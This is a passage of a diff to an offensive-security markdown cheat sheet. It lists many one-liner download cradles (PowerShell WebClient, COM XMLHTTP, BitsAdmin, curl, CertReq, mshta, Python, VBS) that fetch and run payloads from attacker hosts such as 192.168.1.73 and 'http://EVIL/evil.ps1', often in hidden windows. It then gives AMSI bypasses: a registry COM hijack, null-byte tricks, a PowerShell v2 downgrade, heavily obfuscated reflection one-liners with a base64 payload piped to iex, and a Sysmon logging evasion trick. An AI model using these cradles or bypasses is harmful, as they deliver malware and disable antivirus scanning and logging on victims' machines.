+powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://192.168.1.73/hello.ps1', '%tmp%\hello.ps1');powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
+      
+$ie=New-Object -comobject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://EVIL/evil.ps1');start-sleep -s 5;$r=$ie.Document.body.innerHTML;$ie.quit();IEX $r
+```
       
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
 
 <br /><br />
 **COM Donwloaders**<br />
 
-      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+```powershell
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
+$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();$h.responseText > $env:tmp\hello.ps1
 
-      $r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
+$r=new-object net.webclient;$r.proxy=[Net.WebRequest]::GetSystemWebProxy();$r.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $r.downloadstring('http://192.168.1.73:8080/hello.ps1');
 
-      [System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
+[System.Net.WebRequest]::DefaultWebProxy;[System.Net.CredentialCache]::DefaultNetworkCredentials;$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://192.168.1.73/hello.ps1',$false);$h.send();iex $h.responseText
       
-![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
+powershell.exe -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"      
+```      
 
 <br /><br />
 **BitsAdmin Downloaders**<br />
 
-      powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
+```powershell
+powershell -w 1 Start-BitsTransfer -Source http://191.162.1.73//hello.ps1 -Destination $env:tmp\hello.ps1
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
+powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '$env:tmp\hello.ps1'
 
-      powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:SSArt http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
+powershell -w 1 -C bitsadmin /transfer purpleteam /download /priority foreground /setcurrentheaders User-Agent:SSArt http://192.168.1.73/hello.ps1 $env:tmp\hello.ps1 && powershell Start-Process -windowstyle hidden -FilePath '%tmp%\hello.ps1'
       
-      powershell -w 1 bitsadmin /create /dOwNlOaD ssart;start-sleep -seconds 1;bitsadmin /addfile ssart http://192.168.1.73/Hello.ps1 $env:tmp\Hello.ps1;start-sleep -seconds 1;bitsadmin /setcustomheaders ssart User-Agent:SSArt;start-sleep -seconds 1;bitsadmin /resume ssart;start-sleep -seconds 1;bitsadmin /complete ssart
+powershell -w 1 bitsadmin /create /dOwNlOaD ssart;start-sleep -seconds 1;bitsadmin /addfile ssart http://192.168.1.73/Hello.ps1 $env:tmp\Hello.ps1;start-sleep -seconds 1;bitsadmin /setcustomheaders ssart User-Agent:SSArt;start-sleep -seconds 1;bitsadmin /resume ssart;start-sleep -seconds 1;bitsadmin /complete ssart
+```
 
 <br /><br />
 **Curl Downloaders**<br />
 
-      cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
+```powershell
+cmd /R curl.exe -s http://192.168.1.73/hello.ps1 -o %tmp%\hello.ps1 -u pedro:s3cr3t
 
-      cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
+cmd /R curl.exe -L -k -s https://raw.githubusercontent.com/r00t-3xp10it/venom/master/venom.sh -o %tmp%\venom.sh -u pedro:s3cr3t
+```
       
 ![tt](https://user-images.githubusercontent.com/23490060/94851389-49e2d880-0420-11eb-8527-147299c70f92.png)
 
 <br /><br />
 **desktopimgdownldr Downloaders**<br />
 
-      set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+```cmd
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr
+```
 
 <br /><br />
 **CertReq Downloaders**<br />
 
-      cmd /c start /b /MIN CertReq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt
+```cmd
+cmd /c start /b /MIN CertReq.exe -Post -config https://example.org/ c:\windows\win.ini output.txt
 
-      powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini $env:tmp\Hello.ps1
+powershell -w 1 CertReq.exe -Post -config http://192.168.1.73/hello.ps1 c:\windows\win.ini $env:tmp\Hello.ps1
+```
       
 ![ComDownloader](https://user-images.githubusercontent.com/23490060/96273174-f3040400-0fc6-11eb-82df-40cc1e60b229.png)
 
 <br /><br />
+**mshta Downloaders**<br />
+
+```cmd
+cmd /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()
+```
+
+<br /><br />
 **Python Downloaders**<br />
 
-      python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
+```python
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
 
-      #!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
+#!/usr/bin/python;import urllib2;u = urllib2.urlopen('http://192.168.1.73/hello.ps1');localFile = open('local_file', 'w');localFile.write(u.read());localFile.close()
+```
 
 <br /><br />
 **VbScript Downloaders (VBS)**<br />
 
-```
+```vbscript
 ' Set your url settings and the saving options
 strFileURL = "https://github.com/r00t-3xp10it/venom/blob/master/bin/Client.exe"
 strHDLocation = "C:\Users\pedro\Desktop\Client.exe"
@@ -2184,6 +2238,7 @@ Set objXMLHTTP = Nothing
 x=MsgBox("File Successfully Downloaded" & vbCrLf & "Storage: C:\Users\pedro\Desktop\Client.exe",64,"VBS Downloader")
 CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.168.1.73 port=666"
 ```
+
 ![tr](https://user-images.githubusercontent.com/23490060/94852614-1143fe80-0422-11eb-8729-5891e729064f.png)
 
 ---
@@ -2196,121 +2251,103 @@ CreateObject("WScript.Shell").Exec "cmd /b /R start /b /min Client.exe ip=192.16
 
 ## AMSI COM/REG Bypass
 
-      Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface
-      that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
-
-![enigma0x3 - AMSI Bypass](http://i66.tinypic.com/mrstv9.png)
-`HINT: Invoke-Expression powershell command flagging AMSI detection`<br />
+Microsoft’s Antimalware Scan Interface (AMSI) was introduced in Windows 10 as a standard interface<br />
+that provides the ability for AV engines to apply signatures to buffers both in memory and on disk.
 
 ---
 
 <br />
 
-- **AMSI** .COM Object DLL hijacking [ enigma0x3 ]
+### **AMSI** .COM Object DLL hijacking [ enigma0x3 ]
 
-      [ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive first, a normal user can hijack
-      the InProcServer32 key and register a non-existent DLL (or a malicious one if you like code execution).
-      In order to do this, there are two registry entries that need to be made:
+[ AMSI COM Bypass ] Since the COM server is resolved via the HKCU hive, a normal user can hijack the InProcServer32 key and<br />
+register a non-existent DLL (or a malicious one if you like code execution). In order to do this, two registry entries needs to be changed:
 
-<br />
+```cmd
+Windows Registry Editor Version 5.00
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
+@="C:\\IDontExist.dll"
+```    
 
-      Windows Registry Editor Version 5.00
-      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}]
-      [HKEY_CURRENT_USER\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32]
-      @="C:\\IDontExist.dll"
-
-<br />
-
-      When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
-      non-existent COM server. This causes a load failure and prevents any scanning methods from being
-      accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
-      you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
-      methods via its COM interface:
-
-![enigma0x3 - AMSI Bypass](http://i67.tinypic.com/2vv6x41.png)
-
-- **Being mean** .. [ one agent.bat with AMSI bypass abilities ;) ]<br />
-
-![enigma0x3 - AMSI Bypass](http://i65.tinypic.com/2rpv0hv.png)
-
-[DLL hijacking technic applied to AMSI-Bypass.bat with agent exec abilities](https://pastebin.com/H2kjLCin)<br />
+When AMSI attempts to starts its COM component, it will query its registered CLSID and return a
+non-existent COM server. This causes a load failure and prevents any scanning methods from being
+accessed, ultimately rendering AMSI useless. Now, when we try to run our “malicious” AMSI test sample,
+you will notice that it is allowed to execute because AMSI is unable to access any of the scanning
+methods via its COM interface: [DLL hijacking technic applied to AMSI-Bypass.bat with agent exec abilities](https://pastebin.com/H2kjLCin)<br />
 
 ---
 
 <br /> 
 
-- **AMSI** bypass using nul bits [Satoshi]
+### **AMSI** bypass using null bits [Satoshi]
 
-      Bypass AMSI mechanism using nul bits before the actual funtion occurs.
-      For file contents, insert "#<NULL>" at the beginning of the file, and any places
-      where additional scans with AMSI occur. For command line contents, wrap them into
-      Invoke-Expression and prepend 'if(0){{{0}}}' -f $(0 -as [char]) +'
+Bypass AMSI mechanism using null bits before the actual funtion occurs. For file contents, insert "#<NULL>" at the beginning of the file and<br />
+any places where additional scans with AMSI occur. For command line contents prepend `'if(0){{{0}}}' -f $(0 -as [char]) +'`
 
 <br />
 
-- For **command line** contents<br />
+For **command line** contents<br />
+	
+```powershell	
+powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')
+```
 
-       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Ne'+'t.WebC'+'lient').DownloadString('ht'+'tp:/'+'/'+'19'+'2.168.1.7'+'1/Invoke-Hello.ps1')
-
-- OR (using [#NULL] before the monitorized syscall)
-
-      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
-
-![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/fU7e51.jpg)
-
-
-- For file contents<br />
-
-![enigma0x3 - AMSI Bypass](http://i64.tinypic.com/15d8gsy.png)
+OR (using [#NULL] before the monitorized syscall)
+	
+```powershell	
+powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
+```
 
 ---
-
-- Bypass or Avoid AMSI by **version Downgrade** <br />
-
-      Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing.
-      If .Net 3.0 is available on a target Windows 10 machine (which is not default) PowerShell
-      v2 can be started  with the -Version option.
-
+	
 <br />
 
-![AMSI Bypass](http://i67.tinypic.com/1z6w1s2.jpg)
+### Bypass or Avoid AMSI by **version Downgrade** <br />
 
-- Oneliner AMSI bypass<br />
+Force it to use PowerShell v2: PowerShell v2 doesn't support AMSI at the time of writing. If .Net 3.0 is available on a target Windows 10<br />
+machine (which is not default) PowerShell v2 can be started  with the -Version 2 option.
 
-      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
+```powershell
+powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
+```
       
-
-![AMSI Bypass](http://i68.tinypic.com/2hd88yg.jpg)
-
 [AMSI Downgrade check applied to AMSI-Downgrade.ps1 (just check if vuln its present)](https://pastebin.com/qkkq5bZy)<br />
 
 ---
-
-- Reflection - Matt Graeber's method<br />
-
-      Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things by
-      Matt, this is my favorite. It doesn't need elevated shell and there is no notification to the user.
-
+	
 <br />
 
-![AMSI Bypass](http://i65.tinypic.com/15hzzvb.png)
+### Reflection - Matt Graeber's method<br />
 
+Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things by Matt,<br />
+this is my favorite. It doesn't need elevated shell and there is no notification to the user.
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+
+$fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$('àmsìSessîõn'.NoRMALiZe([char](70+54-54)+[cHaR](111)+[cHar](114+24-24)+[chaR](106+3)+[chAR](68+26-26)) -replace [CHAR](24+68)+[chaR]([BytE]0x70)+[CHar]([bYtE]0x7b)+[cHAr](77+45-45)+[chaR](62+48)+[CHAR](125*118/118))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.$([cHAr](65)+[cHaR]([byTe]0x6d)+[ChaR]([ByTe]0x73)+[CHaR]([BYte]0x69)+[CHaR](85*31/31)+[cHAR]([byte]0x74)+[cHAR](105)+[cHar](108)+[Char](115+39-39))").GetField("$([char]([bYtE]0x61)+[ChaR]([BYte]0x6d)+[Char](55+60)+[chAr](105+97-97)+[CHAr]([byTe]0x43)+[ChaR](111+67-67)+[char]([BytE]0x6e)+[cHaR]([bYtE]0x74)+[cHAr](101)+[CHar](120)+[cHAR](116))", "NonPublic,Static").SetValue($null, [IntPtr]$fwi);
+
+[SySTEm.tExt.eNcODinG]::uNiCOde.gEtsTRING([sYsTeM.coNverT]::FRomBaSe64StRINg("IwBVAG4AawBuAG8AdwBuACAALQAgAEYAbwByAGMAZQAgAGUAcgByAG8AcgAgAAoAJABmAHQAdgB1AGMAdgB4AD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAQQBsAGwAbwBjAEgARwBsAG8AYgBhAGwAKAAoADkAMAA3ADYAKQApADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAJAAoAFsAQwBoAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADUAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANwA5ACkAKwBbAGMAaABhAHIAXQAoADQAMQArADcANAApACsAWwBDAEgAQQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAEMAaABBAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2ADUAKQArAFsAQwBoAEEAcgBdACgAMQAwADkAKwA4ADEALQA4ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAHkAVABlAF0AMAB4ADIAZQApACsAWwBjAGgAQQByAF0AKAA3ADcAKwAyADYALQAyADYAKQArAFsAYwBIAGEAUgBdACgAMwAzACsANgA0ACkAKwBbAGMASABBAHIAXQAoAFsAQgBZAFQARQBdADAAeAA2AGUAKQArAFsAQwBoAGEAUgBdACgANgA3ACsAMwAwACkAKwBbAEMASABBAFIAXQAoADEAMAAzACsANAA3AC0ANAA3ACkAKwBbAEMAaABBAFIAXQAoADcAOQArADIAMgApACsAWwBjAEgAQQBSAF0AKAAxADAAOQApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgA1ACkAKwBbAEMAaABBAHIAXQAoADEAMAAwACsAMQAwACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3ADQAKQApAC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAKABbAEMAaABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAFkAdABlAF0AMAB4ADYAZAApACsAWwBjAGgAQQByAF0AKAAxADEANQArADMANAAtADMANAApACsAWwBjAEgAYQByAF0AKAAxADAANQApACsAWwBjAEgAYQByAF0AKABbAGIAWQB0AGUAXQAwAHgANQA1ACkAKwBbAEMASABhAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA3ADQAKQArAFsAYwBoAEEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAOQApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgBjACkAKwBbAGMAaABBAFIAXQAoADEAMQA1ACsANgA0AC0ANgA0ACkAKQAiACkALgBHAGUAdABGAGkAZQBsAGQAKAAiACQAKAAnAOQAbQBzAO0AUwBlAHMAcwDtAPQAbgAnAC4ATgBPAFIAbQBBAGwAaQBaAEUAKABbAEMAaABhAFIAXQAoADcAMAApACsAWwBjAEgAYQByAF0AKAAxADEAMQAqADMAMQAvADMAMQApACsAWwBjAGgAYQBSAF0AKAAxADEANAAqADQAOAAvADQAOAApACsAWwBDAGgAYQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANgBkACkAKwBbAGMAaABhAFIAXQAoADYAOAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABhAFIAXQAoAFsAYgBZAFQAZQBdADAAeAA1AGMAKQArAFsAYwBIAEEAcgBdACgAOAAxACsAMwAxACkAKwBbAEMASABhAHIAXQAoAFsAQgBZAFQAZQBdADAAeAA3AGIAKQArAFsAQwBoAGEAUgBdACgAWwBiAHkAdABFAF0AMAB4ADQAZAApACsAWwBDAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgBlACkAKwBbAEMASABhAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA3AGQAKQApACIALAAgACIATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAiACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAgACQAbgB1AGwAbAApADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACIAJAAoAFsAQwBoAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADUAMwApACsAWwBjAGgAQQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANwA5ACkAKwBbAGMAaABhAHIAXQAoADQAMQArADcANAApACsAWwBDAEgAQQByAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAEMAaABBAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2ADUAKQArAFsAQwBoAEEAcgBdACgAMQAwADkAKwA4ADEALQA4ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAHkAVABlAF0AMAB4ADIAZQApACsAWwBjAGgAQQByAF0AKAA3ADcAKwAyADYALQAyADYAKQArAFsAYwBIAGEAUgBdACgAMwAzACsANgA0ACkAKwBbAGMASABBAHIAXQAoAFsAQgBZAFQARQBdADAAeAA2AGUAKQArAFsAQwBoAGEAUgBdACgANgA3ACsAMwAwACkAKwBbAEMASABBAFIAXQAoADEAMAAzACsANAA3AC0ANAA3ACkAKwBbAEMAaABBAFIAXQAoADcAOQArADIAMgApACsAWwBjAEgAQQBSAF0AKAAxADAAOQApACsAWwBjAGgAQQBSAF0AKABbAGIAWQB0AEUAXQAwAHgANgA1ACkAKwBbAEMAaABBAHIAXQAoADEAMAAwACsAMQAwACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA3ADQAKQApAC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAKABbAEMAaABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADEAKQArAFsAYwBoAGEAcgBdACgAWwBiAFkAdABlAF0AMAB4ADYAZAApACsAWwBjAGgAQQByAF0AKAAxADEANQArADMANAAtADMANAApACsAWwBjAEgAYQByAF0AKAAxADAANQApACsAWwBjAEgAYQByAF0AKABbAGIAWQB0AGUAXQAwAHgANQA1ACkAKwBbAEMASABhAHIAXQAoAFsAYgBZAHQAZQBdADAAeAA3ADQAKQArAFsAYwBoAEEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAOQApACsAWwBDAEgAYQByAF0AKABbAGIAWQBUAGUAXQAwAHgANgBjACkAKwBbAGMAaABBAFIAXQAoADEAMQA1ACsANgA0AC0ANgA0ACkAKQAiACkALgBHAGUAdABGAGkAZQBsAGQAKAAiACQAKAAnAOMAbQBzAO0AQwD0AG4AdABlAHgAdAAnAC4AbgBvAFIAbQBBAEwAaQBaAEUAKABbAEMAaABhAHIAXQAoADUAKwA2ADUAKQArAFsAYwBoAEEAcgBdACgAMQAxADEAKgA1ADQALwA1ADQAKQArAFsAYwBIAGEAUgBdACgAOQA2ACsAMQA4ACkAKwBbAGMAaABhAFIAXQAoADEAMAA5ACsAMQAtADEAKQArAFsAQwBoAEEAcgBdACgAWwBiAHkAVABFAF0AMAB4ADQANAApACkAIAAtAHIAZQBwAGwAYQBjAGUAIABbAGMAaABBAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA1AGMAKQArAFsAQwBIAEEAcgBdACgAWwBCAFkAdABlAF0AMAB4ADcAMAApACsAWwBDAEgAQQByAF0AKABbAGIAWQB0AEUAXQAwAHgANwBiACkAKwBbAEMASABhAFIAXQAoADcANwArADUAOQAtADUAOQApACsAWwBDAEgAYQByAF0AKABbAGIAeQB0AGUAXQAwAHgANgBlACkAKwBbAEMASABhAFIAXQAoADEAMgA1ACkAKQAiACwAIAAiAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAIgApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAIABbAEkAbgB0AFAAdAByAF0AJABmAHQAdgB1AGMAdgB4ACkAOwA="))|iex
+
+$pacinojz=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076*5049/5049));[Ref].Assembly.GetType("$([char](83)+[chAR]([byTE]0x79)+[cHaR](74+41)+[CHar](55+61)+[cHAr]([bYte]0x65)+[CHar](109+88-88)+[cHAr](46)+[cHAR]([BYtE]0x4d)+[CHAR]([BYtE]0x61)+[ChAr](110)+[Char]([BYTe]0x61)+[cHAR](103+19-19)+[cHAR](101)+[cHaR]([BYte]0x6d)+[ChAr]([ByTE]0x65)+[chAr]([BYte]0x6e)+[CHaR]([Byte]0x74)).Automation.$('ÄmsîUtîls'.NoRmaLize([cHAr]([ByTe]0x46)+[cHar](41+70)+[cHar]([bYTe]0x72)+[CHar](109)+[chAR]([BYtE]0x44)) -replace [ChaR](66+26)+[CHar](112+32-32)+[chAr]([ByTE]0x7b)+[chAr](77+60-60)+[chaR](110)+[cHAr](125*8/8))").GetField("$([cHAr](66+31)+[chAR](109)+[chaR]([BYte]0x73)+[ChAR]([BYtE]0x69)+[CHar](83+15-15)+[Char](101)+[cHAR](115*34/34)+[CHAr](106+9)+[CHaR]([BytE]0x69)+[ChAR](111)+[cHaR]([byte]0x6e))", "NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("$([char](83)+[chAR]([byTE]0x79)+[cHaR](74+41)+[CHar](55+61)+[cHAr]([bYte]0x65)+[CHar](109+88-88)+[cHAr](46)+[cHAR]([BYtE]0x4d)+[CHAR]([BYtE]0x61)+[ChAr](110)+[Char]([BYTe]0x61)+[cHAR](103+19-19)+[cHAR](101)+[cHaR]([BYte]0x6d)+[ChAr]([ByTE]0x65)+[chAr]([BYte]0x6e)+[CHaR]([Byte]0x74)).Automation.$('ÄmsîUtîls'.NoRmaLize([cHAr]([ByTe]0x46)+[cHar](41+70)+[cHar]([bYTe]0x72)+[CHar](109)+[chAR]([BYtE]0x44)) -replace [ChaR](66+26)+[CHar](112+32-32)+[chAr]([ByTE]0x7b)+[chAr](77+60-60)+[chaR](110)+[cHAr](125*8/8))").GetField("$([ChAR](97*35/35)+[ChAR](109*69/69)+[cHar]([Byte]0x73)+[Char]([byTE]0x69)+[ChAr]([bYte]0x43)+[chAR]([BYtE]0x6f)+[ChaR](27+83)+[chAR](116+57-57)+[cHaR](101)+[char](87+33)+[CHAr](116))", "NonPublic,Static").SetValue($null, [IntPtr]$pacinojz);
+
+```
+	
 [@mattifestation reflection technic applied to AMSI-Reflection.ps1 with Bypass/download/exec abilities](https://pastebin.com/THJQvHnU)<br />
 
 ---
+	
+<br />	
 
-- @danielbohannon **escaping percent** signs bug (EventVwr.exe)
+### @danielbohannon **escaping percent** signs bug (EventVwr.exe)
 
-      Daniel Bohannon disclosure a few days ago (19 march 2018) one AMSI obfuscation technic that
-      relays on an escaping bug with percent signs in Sysmon EID 1's CommandLine field that is
-      rendering incorrect data when viewed with EventVwr.exe.
+Daniel Bohannon disclosure a few days ago (19 march 2018) one AMSI obfuscation technic that relays on an escaping bug<br />
+with percent signs in Sysmon EID 1's CommandLine field that is rendering incorrect data when viewed with EventVwr.exe.
 
-<br />
-
-      cmd.exe /c "echo PUT_EVIL_COMMANDS_HERE||%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1"
-
-![powershell obfuscation](http://i.cubeupload.com/OzA5WV.jpg)
-![powershell obfuscation](http://i.cubeupload.com/MpI26u.png)
+```cmd
+cmd.exe /c "echo PUT_EVIL_COMMANDS_HERE||%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1%1"
+```
 
 ---
 
